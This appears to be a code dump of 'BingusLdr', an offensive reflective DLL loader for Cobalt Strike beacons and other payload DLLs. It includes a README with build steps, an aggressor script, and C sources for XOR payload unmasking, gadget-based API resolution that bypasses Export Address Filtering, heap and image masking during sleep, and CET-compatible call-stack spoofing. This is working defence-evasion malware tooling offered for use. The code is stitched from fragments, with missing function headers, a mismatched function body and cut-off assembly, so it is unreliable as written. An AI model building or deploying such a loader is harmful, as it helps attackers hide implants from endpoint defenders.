`README.md`:

```md
# BingusLdr

<p align="center">
  <img src="peak.png" width="600"/>
</p>

BingusLdr is a DLL loader built with [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) that uses a CET compatible stack spoofing technique.


## Features
- CET compatible stack spoofing
- EAF compatible API resolution
- Heap masking
- Image masking

See the blog post: [BingusLdr: CET Compatible Stack Spoofing](https://bigbingus.com/posts/bingusldr-cet-stack-spoofing/)

## Prerequisites
- mingw-w64
- [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) `link` should be present in `dist/`
- [libtcg.x64.zip](https://tradecraftgarden.org/tradecraft.html) should bepresent in `tcg/libtcg/`

## Cobalt Strike

- `make`
- Place `crystalpalace.jar` in the Cobalt Strike client directory
- Import `bingus.cna`

## Other DLLs

- `make DLL_64=<PAYLOAD>.dll`
- Output at `./bin/go.x64.bin`

## References
- [Eden](https://github.com/Cobalt-Strike/eden)
- [OdinLdr](https://github.com/NtDallas/OdinLdr)
- [Finding Truth in the Shadows](https://www.elastic.co/security-labs/finding-truth-in-the-shadows)
- [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html)
```

```cna
import crystalpalace.spec.* from: crystalpalace.jar;

sub print_info {
   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Bingus]\o " . $1 );
}

set BEACON_RDLL_SIZE {
   return "0";
}

set BEACON_RDLL_GENERATE
{
    local ( '$beacon $arch $spec_path $spec $cap $final' );

    $beacon = $2;
    $arch   = $3;

    print_info ( "BEACON_RDLL_GENERATE" );

    $spec_path = getFileProper ( script_resource ( "" ), "bingus.spec" );
    print_info ( $spec_path );
    $spec      = [ LinkSpec Parse: $spec_path ];
    if (strlen($spec) == 0) {
        warn("[!] Failed to parse bingus.spec");
        return $null;
    }
    $final     = [ $spec run: $beacon, [ new HashMap ] ];

    if ( strlen ( $final ) == 0 )
    {
        warn ( "Failed to build payload" );
        return $null;
    }

    print_info("[+] Bingus ldr payload size: " . strlen($final) . " bytes");
    return $final;
}
```

```c
void ApplySectionPermissions(DLLDATA * dll, char * dst) {
    DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    DWORD                   perms            = 0;
    DWORD                   oldprot;

    sectionHdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    g_beacon_state.numSections = (numberOfSections > MAX_SECTIONS) ? MAX_SECTIONS : numberOfSections;

    for (DWORD x = 0; x < g_beacon_state.numSections; x++) {
        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE) && FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE))
            perms = PAGE_EXECUTE_READWRITE;
        else if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE))
            perms = PAGE_EXECUTE_READ;
        else if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_WRITE))
            perms = PAGE_READWRITE;
        else
            perms = PAGE_READONLY;

        /* Cache section info for UnmaskBeacon */
        g_beacon_state.sectionVA[x]   = sectionHdr->VirtualAddress;
        g_beacon_state.sectionSize[x] = sectionHdr->Misc.VirtualSize;
        g_beacon_state.sectionProt[x] = perms;

        KERNEL32$VirtualProtect(dst + sectionHdr->VirtualAddress, sectionHdr->Misc.VirtualSize, perms, &oldprot);
        sectionHdr++;
    }
}

char * unmask(char * srcvalue) {
    _RESOURCE* dll = (_RESOURCE*)srcvalue;
    char      * dst = NULL;

    dst = KERNEL32$VirtualAlloc(NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    for (int x = 0; x < dll->length; x++) {
        dst[x] = dll->value[x] ^ xorkey[x % sizeof(xorkey)];
    }

    return dst;
}

 * Our reflective loader itself, have fun, go nuts!
 */
void load() {
    char       * dst;
    char       * src;
    DLLDATA      data;
    IMPORTFUNCS  funcs;

    g_beacon_state.base = NULL;
    g_beacon_state.size = 0;

    /* find our DLL appended to this PIC */
    src = findAppendedDLL();
    src = unmask(src);

    /* parse our DLL! */
    ParseDLL(src, &data);

    /* allocate memory for it! */
    dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

    /* load the damned thing */
    LoadDLL(&data, src, dst);

    /* setup our IMPORTFUNCS data structure */
    funcs.GetProcAddress = _GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    /* process the imports */
    ProcessImports(&funcs, &data, dst);

    ApplySectionPermissions(&data, dst);

    /* Enable full-image XOR masking of the loaded beacon. */
    g_beacon_state.base = dst;
    g_beacon_state.size = SizeOfDLL(&data);

    /* pass execution to our DLL */
    const DLLMAIN_FUNC dllEntry = EntryPoint(&data, dst);
    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);

    dprintf("[pid %lu] [GO] Calling DLL\n", KERNEL32$GetCurrentProcessId());
    dllEntry((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
    dllEntry((HINSTANCE)NULL, 4, NULL);
}
```

```c
void applyxor(char * data, DWORD len) {
    for (DWORD x = 0; x < len; x++) {
        data[x] ^= xorkey[x % 16];
    }

void trackAllocation(enum HEAP_ALLOCATION_METHOD method, HANDLE hHeap, LPVOID lpAddress, SIZE_T dwSize) {
    // Masking the smaller allocations breaks pivot sleep in CS and I cant be bothered to figure out why
    if (dwSize < 45) return;

    //dprintf("[heap] Tracking allocation: %p, size: %lu, method: %d\n", lpAddress, (DWORD)dwSize, method);
    if (g_heap_alloc_list.pAllocations == NULL) {
        g_heap_alloc_list.pAllocations = MSVCRT$calloc(5, sizeof(HEAP_ALLOCATION));
        g_heap_alloc_list.dwCapacity = 5;
    }

    if (g_heap_alloc_list.dwSize >= g_heap_alloc_list.dwCapacity) {
        g_heap_alloc_list.dwCapacity *= 2;
        g_heap_alloc_list.pAllocations = MSVCRT$realloc(g_heap_alloc_list.pAllocations, g_heap_alloc_list.dwCapacity * sizeof(HEAP_ALLOCATION));
    }

    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].method = method;
    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].hHeap = hHeap;
    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].lpAddress = lpAddress;
    g_heap_alloc_list.pAllocations[g_heap_alloc_list.dwSize].dwSize = dwSize;
    g_heap_alloc_list.dwSize++;
}

void untrackAllocation(LPVOID lpAddress) {
    //dprintf("[heap] Untracking allocation: %p\n", lpAddress);
    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
        if (g_heap_alloc_list.pAllocations[i].lpAddress == lpAddress) {
            g_heap_alloc_list.pAllocations[i] = g_heap_alloc_list.pAllocations[--g_heap_alloc_list.dwSize];
            return;
        }
    }
}

    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
        dprintf("[heap] Allocation %lu: %p, Heap: %p, size: %lu, method: %d\n",
                i,
                g_heap_alloc_list.pAllocations[i].lpAddress,
                g_heap_alloc_list.pAllocations[i].hHeap,
                (DWORD)g_heap_alloc_list.pAllocations[i].dwSize,
                g_heap_alloc_list.pAllocations[i].method);
    }

    for (DWORD i = 0; i < g_heap_alloc_list.dwSize; i++) {
        if (g_heap_alloc_list.pAllocations[i].method == HEAP_ALLOC) {
            applyxor(g_heap_alloc_list.pAllocations[i].lpAddress, (DWORD)g_heap_alloc_list.pAllocations[i].dwSize);
        } else {
            //dprintf("[heap] Non HEAP_ALLOC allocation\n");
        }
    }
}

void MaskBeacon() {
    if (g_beacon_state.base != NULL) {
        //dprintf("[+] Masking : 0x%p : %lu\n", g_beacon_state.base, g_beacon_state.size);
        DWORD oldProt;
        stitch(KERNEL32$VirtualProtect, 4, g_beacon_state.base, g_beacon_state.size, PAGE_READWRITE, &oldProt);
        applyxor(g_beacon_state.base, g_beacon_state.size);
        //dprintf("[+] Masking Complete\n");
    }
}

    if (g_beacon_state.base != NULL) {
        applyxor(g_beacon_state.base, g_beacon_state.size);

        for (DWORD x = 0; x < g_beacon_state.numSections; x++) {
            stitch(KERNEL32$VirtualProtect, 4, g_beacon_state.base + g_beacon_state.sectionVA[x], g_beacon_state.sectionSize[x], g_beacon_state.sectionProt[x], &oldProt);
        }
    }
}
```

```c
char * findDataCave(char * dllBase, int length) {

	IMAGE_SECTION_HEADER  * sectionNxt       = NULL;

    if (text_start == 0) return FALSE;

    BYTE read[3] = { 0x48, 0x8B, 0x40 }; // mov rax, qword ptr [rax +/- 8_disp]
    for (PBYTE i = (PBYTE)text_start; (UINT_PTR)i < text_end; i++) {
        if (_memcmp(i, read, 3) && *(i+4) == 0xC3) {
            *disp = *(PINT8)(i+3);
            return i;
        }
    }
    return NULL;
}

__attribute((naked))
UINT_PTR readViaGadget(LPVOID gadget, INT8 disp, LPVOID address) {
    __asm(
    "sub r8, rdx\n"
    "mov rax, r8\n"
    "call rcx\n"
    "ret\n"
    );
}

__forceinline DWORD ror( DWORD d )
{
    return _rotr( d, 13 );
}

__forceinline DWORD hash(LPVOID gadget, INT8 disp, char * c)
{
    register DWORD h = 0;
    do
    {
        h = ror( h );
        h += (BYTE)readViaGadget(gadget, disp, c);
        c++;
    } while( (BYTE)readViaGadget(gadget, disp, c) );

    return h;
}

void * findFunctionByHashGadget(char * src, DWORD wantedFunction) {
    DLLDATA                  data;
    IMAGE_DATA_DIRECTORY   * exportTableHdr;
    IMAGE_EXPORT_DIRECTORY * exportDir;
    DWORD                  * exportName;
    WORD                   * exportOrdinal;
    DWORD                  * exportAddress;
    DWORD                    hashValue;
    LPVOID                   readGadget;
    INT8                     disp;

    readGadget = findReadGadget((HMODULE)src, &disp);

    /* parse our DLL! */
    ParseDLL(src, &data);

    /* grab our export directory */
    exportTableHdr = GetDataDirectory(&data, IMAGE_DIRECTORY_ENTRY_EXPORT);
    exportDir      = (IMAGE_EXPORT_DIRECTORY *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportTableHdr->VirtualAddress));

    /* walk the array of exported names/address ordinals */
    exportName    = (DWORD *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfNames));
    exportOrdinal = (WORD *) PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfNameOrdinals));

    while (TRUE) {
        hashValue = hash(readGadget, disp, (char *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, exportName)));
        if (hashValue == wantedFunction) {
            /* figure out the base of our AddressOfFunctions array */
            exportAddress   = (DWORD *)PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, &exportDir->AddressOfFunctions));

            /* increment it by the current value of our exportOrdinal array */
            exportAddress  += (WORD)readViaGadget(readGadget, disp, exportOrdinal);

            /* and... there-in is our virtual address to the actual ptr we want */
            return PTR_OFFSET(src, (DWORD)readViaGadget(readGadget, disp, exportAddress));
        }

        exportName++;
        exportOrdinal++;
    }
}

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" "KERNEL32, NTDLL" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHashGadget(hModule, funcHash);
}

/*
 * This is our default DFR resolver. It resolves Win32 APIs not handled by another resolver.
 */
FARPROC resolve_ext(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL)
		hModule = LoadLibraryA(mod);

	return GetProcAddress(hModule, func);
}
```

```c
        "dec rax\n"
        "dec rcx\n"
        "jmp .stack_args\n"

        "lea rax, [r10]\n"                      // &func_call.function = pointer to target function ptr
        "movsxd rdx, dword ptr [r10 + 120]\n"   // call displacement (gadget.call_disp)
        "sub rax, rdx\n"                        // apply displacement

        "movsx rdx, byte ptr [r10 + 124]\n"     // jmp displacement (gadget.jmp_disp)
        "lea rsi, [r10 + 104]\n"                // &gadget.jmp_ret slot (holds continuation)

        "mov r8,  [r11 + 16]\n"                 // func_call.argv[2]

DWORD getFrameSize(PRUNTIME_FUNCTION p_runtime_function, DWORD64 image_base) {
    UBYTE i = 0;
    STACK_FRAME frame = { 0 };
    PUNWIND_INFO p_unwind_info = (PUNWIND_INFO)(p_runtime_function->UnwindData + image_base);
    for (; i < p_unwind_info->CountOfCodes; i++) {
        ULONG unwind_op = p_unwind_info->UnwindCode[i].UnwindOp;
        ULONG op_info = p_unwind_info->UnwindCode[i].OpInfo;

        switch (unwind_op) {
            case UWOP_PUSH_NONVOL:
                frame.size += 8;
                if (op_info == RBP_OP_INFO) {
                    frame.pushed_rbp = TRUE;
                    frame.code_count = p_unwind_info->CountOfCodes;
                }
                break;
            case UWOP_SAVE_NONVOL:
                i += 1;
                break;
            case UWOP_ALLOC_SMALL:
                frame.size += ((op_info * 8) + 8);
                break;
            case UWOP_ALLOC_LARGE:
                i += 1;
                ULONG frame_offset = p_unwind_info->UnwindCode[i].FrameOffset;
                if (op_info == 0) frame_offset *= 8;
                else {
                    i += 1;
                    frame_offset += (p_unwind_info->UnwindCode[i].FrameOffset << 16);
                }
                frame.size += frame_offset;
            case UWOP_SET_FPREG:
                frame.sets_fp = TRUE;
                break;
            case UWOP_SAVE_XMM128:
                i += 1;
                break;
            case UWOP_SAVE_XMM128_FAR:
                i += 2;
                break;
            default:
                break;
        }
    }

    if ((p_unwind_info->Flags & UNW_FLAG_CHAININFO) != 0) {
        i = p_unwind_info->CountOfCodes;
        if ((i & 1) != 0) i += 1;
        p_runtime_function = (PRUNTIME_FUNCTION)(&p_unwind_info->UnwindCode[i]);
        return getFrameSize(p_runtime_function, image_base);
    }

    //frame.size += 8;

    return frame.size;
}

UINT_PTR getText(HMODULE h_module, OUT PUINT_PTR end) {
    UINT_PTR base = (UINT_PTR)h_module;
    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)base;
    if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(base + dos_hdr->e_lfanew);
    if (nt_hdr->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sec_hdr = IMAGE_FIRST_SECTION(nt_hdr);

    UINT_PTR text_start = 0;
    UINT_PTR text_end = 0;
    for (WORD i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        if (_memcmp(sec_hdr[i].Name, ".text", 6)) {
            text_start = base + sec_hdr[i].VirtualAddress;
            text_end = text_start + sec_hdr[i].Misc.VirtualSize;
            break;
        }
    }
    *end = text_end;
    return text_start;
}

BOOL findGadget(HMODULE h_module, OUT PGADGET gadget, SIZE_T max_frame_size) {
    //dprintf("[+] findGadget2\n");
    SIZE_T text_end = 0;
    PBYTE text_start = (PBYTE)getText(h_module, &text_end);

    // This could be expaned for other registers and displacements probably
    BYTE call[2] = { 0xFF, 0x90 }; // call [rax +/- 32_disp]
    BYTE jmp[2] = { 0xFF, 0x66 };  // jmp [rsi +/- 8_disp]
    for (PBYTE i = (PBYTE)text_start; (UINT_PTR)i < text_end; i++) {
        if (_memcmp(i, call, 2) && _memcmp(i + 6, jmp, 2)) {
            PRUNTIME_FUNCTION p_runtime_func = getRuntimeFunction(i, NULL);
            if (p_runtime_func == NULL) {
                //dprintf("[!] No unwind data for gadget\n");
                continue;
            }
            gadget->frame_size = getFrameSize(p_runtime_func, (DWORD64)h_module);
            if (gadget->frame_size == -1 || gadget->frame_size > max_frame_size) {
                //dprintf("[!] Gadget frame too large\n");
                continue;
            }

            gadget->call = i;
            gadget->jmp_ret = (UINT_PTR)0;
            gadget->call_disp = *(PINT32)(i+2);
            gadget->jmp_disp = *(PINT8)(i+8);
            return TRUE;
        }
    }
    return FALSE;
}

UINT_PTR stitch(LPVOID function, DWORD argc, ...) {
    FUNC_CALL func_call = { 0 };
    func_call.function = (UINT_PTR)function;
    func_call.argc = argc;
    va_list args;
    va_start(args, argc);
    for (DWORD i = 0; i < argc; i++) {
        func_call.argv[i] = va_arg(args, UINT_PTR);
    }
    va_end(args);
    g_stitch_args->func_call = func_call;

    GADGET gadget = { 0 };
    getGadget(&gadget, g_stitch_args->go_frame_size);
    g_stitch_args->gadget = gadget;
    g_stitch_args->rsp_disp = (g_stitch_args->go_frame_size - gadget.frame_size);

    //dprintf("[+] GO: %d\tGadget: %d\n", g_stitch_args->go_frame_size, gadget.frame_size);

    KERNEL32$SwitchToFiber(g_clean_state);

    return g_stitch_args->ret;
}

VOID getGadget(PGADGET p_gadget, SIZE_T max_frame_size) {
    DWORD needed = 0;
    if (!KERNEL32$K32EnumProcessModulesEx((HANDLE)-1, NULL, 0, &needed, LIST_MODULES_ALL)) {
        //dprintf("[getImages] %lu\n", KERNEL32$GetLastError());
    }

    HMODULE* modules = NTDLL$RtlAllocateHeap(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
    if (!KERNEL32$K32EnumProcessModulesEx((HANDLE)-1, modules, needed, &needed, LIST_MODULES_ALL)) {
        //dprintf("[getImages][2] %lu\n", KERNEL32$GetLastError());
    }

    for (int i = 0; i < needed/sizeof(HMODULE); i++) {
        if (modules[i] == NULL) continue;

        if (!findGadget(KERNEL32$GetModuleHandleA("ntdll.dll"), p_gadget, max_frame_size))
            continue;
        else {
            //dprintf("[+] Found gadget %s : 0x%p : 0x%x\n", modules[i], p_gadget->call, p_gadget->frame_size);
            break;
        }
    } if (p_gadget->call == 0) {
        return;
    }
}

UINT_PTR findReturnAddressOffset(UINT_PTR ret_addr, UINT_PTR rsp) {
    ULONG_PTR low, high;
    KERNELBASE$GetCurrentThreadStackLimits(&low, &high);

    for (UINT_PTR rspi = (UINT_PTR)rsp; rspi < high; rspi += sizeof(UINT_PTR)) {
        if (*(PUINT_PTR)rspi == (UINT_PTR)ret_addr) return rspi - (UINT_PTR)rsp;
    }
    return 0;
}
```
